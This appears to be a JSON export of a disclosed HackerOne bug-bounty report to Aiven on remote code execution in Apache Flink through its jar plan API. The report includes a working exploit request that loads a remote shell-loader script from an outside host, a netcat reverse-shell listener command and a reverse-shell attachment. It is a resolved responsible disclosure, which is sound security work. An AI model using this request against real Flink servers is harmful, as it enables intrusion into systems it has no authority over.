@@ -1,0 +1,134 @@
+{
+  "id": 1418891,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDE4ODkx",
+  "url": "https://hackerone.com/reports/1418891",
+  "title": "Apache Flink RCE via GET jar/plan API Endpoint",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2021-12-07T12:24:33.374Z",
+  "submitted_at": "2021-12-07T12:24:33.484Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jarij",
+    "url": "/jarij",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/6kdmeekofsrtsp1e4v6qpznlxh7k/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 45650,
+    "url": "https://hackerone.com/aiven_ltd",
+    "handle": "aiven_ltd",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4dvu0xq9iacojs2s7fgkd3pbu87f/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/4dvu0xq9iacojs2s7fgkd3pbu87f/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Aiven Ltd",
+      "twitter_handle": "",
+      "website": "https://aiven.io",
+      "about": "Fully-managed and hosted database and messaging services on all major clouds in dozens of regions worldwide."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-11-08T06:30:33.425Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-10-25T09:59:49.647Z",
+  "team_member_agreed_on_going_public_at": "2022-11-08T06:30:33.036Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\nAiven has not restricted access to the GET `jars/{jar_id}/plan` API. This endpoint can be used to load java class files with the specified arguments that are in the java classpath on the server. This can be abused to gain RCE on the Apache Flink Server.\n\n## Steps To Reproduce:\n\nThe video below shows how to setup the Apache Flink instance and run the PoC. Feel free to use my VPS which will make triaging somewhat easier (`ssh ████████`, password: `██████`):\n\n█████████\n\n\n  1. Login to my aiven account: `████`, password: `██████`\n  1. Run the SQL job as demonstrated in the video\n  1. Open the Flink Web UI and verify that there is a new job in the jobs panel.\n  1. Setup netcat reverse shell listener on the VPS: `nc -n -lvp 8888`\n  1. Update the poc.py variables to match your instance, if you are not using my Apache Flink instance\n  1. Run the poc: `python3 poc.py`\n  1. Reverse shell connection should pop up\n 1. After connection has been closed, the Apache Flink will crash, so the Aiven service daemon will  have to restart it. Because of this, you have to run new SQL job after every time you run the poc script\n\n# API Request\n\nHere's the HTTP API request that exploits the issue:\n\n```http\nGET /jars/145df7ff-c71a-4f3a-b77a-ee4055b1bede_a.jar/plan?entry-class=com.sun.tools.script.shell.Main&programArg=-e,load(\"https://fs.bugbounty.jarijaas.fi/aiven-flink/shell-loader.js\")&parallelism=1 HTTP/1.1\nHost: ████\nConnection: keep-alive\nPragma: no-cache\nCache-Control: no-cache\nAuthorization: Basic █████\nsec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"\nAccept: application/json, text/plain, */*\nsec-ch-ua-mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\nsec-ch-ua-platform: \"Windows\"\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nAccept-Language: en-US,en;q=0.9,fi;q=0.8\n```\n\n## Impact\n\nAttacker can execute commands on the server and use this access to potentially pivot into other resources in the network.",
+  "bounty_amount": "6000.0",
+  "formatted_bounty": "$6,000",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1536836,
+      "file_name": "reverse-shell.js",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/g9f0e8ibkabvucdhgbbp9w2notk7?response-content-disposition=attachment%3B%20filename%3D%22reverse-shell.js%22%3B%20filename%2A%3DUTF-8%27%27reverse-shell.js&response-content-type=text%2Fjavascript&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYSRTPENT%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150904Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQClnbG8vqYrSqzQXmDUUgMjhtuh58NLNeDsbWuSsRg1hgIhAPcxhE464d7O3V1HZ0%2FdXfm0KtSqutLgcx41x%2B7CTiarKrsFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgyStI%2FGQ7th1cnchbQqjwUnkogl7RDJ9CdGbaQOhpqMdqTgX4AfVCSGZTTue0rS7M5I0Mx5xsKGNVgjZKt75IewwfhhfHL%2FRAHBkrPAZW41%2BG8lI79wO9KS67s83JTwK2kp9gVFtonK2Jfh8PwIcLG29bYD7kEkke5ezJCHoDK2Jy%2BoTjc2QBE9n%2FScRs%2BpZHSp%2Bg9IKT87MqqGWmw1Dj4gBDXz7IQovNO2JnVjXoyLgGlo6UpUafdv90fYERh0eHtxN%2FIVhbM%2Fm713wPtYKOiI0I5oJI%2BHTe1a6q3fbt9Oqx0xD%2FuMJHAI68OXeFTFuATXBvZ65Yl2HNdmMn57synTIbWJs2z9tDqOR0%2BzRQ9rFvcy9E4FNotAoLt8%2BrYjMRY4zFLhqNtFY%2FWIjwDvsK34lC%2FPK1La3VelQTYIQKJwaDKsiXSGWsEtzi1NqITAfNI1v%2BIF7J3Zw9GPnJb9frHldcZC79b%2BC%2FCLzukzZXg1GCxrqyL%2FgvgyORrnXT6X1ny2x6caaZQnJuWKZFNigkKYBVyWq2abk19SEh3UErx9zBkW%2BBgvSwUbVSbgDqV7K%2BynWXRf4dt0S%2F8RXrFUAzt%2BA77T%2BJLiO4kmgR4FN3hE1Sis3JGXKBUOK1vPH7gD%2FEd7vOax16%2ForWCCoKmCxr5CAEfhu1CiyqCOHUboyxJXjebKNs3CO0TsGnb89QVMeX8ylZjtms20d%2FWlIvMRGgQpIhgTlHjJzYLgLtq0SF0T%2BEuOtQF8ElGvwSU5c2oqZrmimGylTc28DlV1ecDGmWhNiSsJ3tf4%2BM4rInVRc8QB4a5aovEQ0ctaWRG3pINYeGQ%2FiMnwgxlGZHw7ZdoMuP6d%2F9aNEeOd4fk9ZtkFnKDDVF%2FeQku4c%2FTNouMWEOx0MM2G%2Fc8GOrABaYsmgwPerzVWftd1ov9iT%2BKGD%2FORm0nrCHhFReLwdAYtJ3AnsqStoLtIZaTMJdjb19NlCTXTVRF1cHYsNgMzkL%2BEXYpZs1wH6tu5YrBExPqozNr51ev%2FtWlFHlgp4HX2Lvp3pyDK1NCGK4sIJipEbG15Dtkjb%2BLasvRqCS8CqBQM8U%2Bioase3l%2FFnWM7dax53w6UtT%2BdRKEGgZ8Y%2FwdR42WGR9WWo33SrtWQPDCM6%2Bo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1b1f1279ad0945d26e37787a1b68a39afb453311bbfcca185fca3b207cc1fea9",
+      "file_size": 622,
+      "type": "text/javascript",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 128,
+  "voters": [
+    "tkoyeung",
+    "porcupineyhairs",
+    "loaymorad",
+    "ejc",
+    "jumpydata",
+    "p4n7h3rx",
+    "n1m0",
+    "rootsploit",
+    "xploiterr",
+    "haxor31337",
+    "and 118 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 41392,
+    "asset_type": "URL",
+    "asset_identifier": "aivencloud.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
